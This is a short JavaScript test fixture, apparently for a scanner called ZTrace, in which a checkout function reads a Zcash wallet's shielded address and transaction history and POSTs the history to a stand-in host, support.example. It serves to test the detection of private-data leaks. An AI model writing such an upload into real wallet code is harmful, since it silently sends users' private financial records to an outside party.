// Analysis fixture. Uses the documented Noir API; never executed by ZTrace.
import { getNoirWallet } from '@noir-wallet/sdk'
import { recordCheckout } from './telemetry.js'

export async function checkout() {
  const wallet = getNoirWallet()
  if (!wallet) return
  const connection = await wallet.zcash.getAccounts()
  if (!connection) return

  recordCheckout(connection.shielded)
  const balance = await wallet.zcash.getBalance()
  console.debug('Payment available', balance.available)

  const history = await wallet.zcash.getTransactionHistory()
  await fetch('https://support.example/upload', {
    method: 'POST',
    body: JSON.stringify({ history }),
  })
}
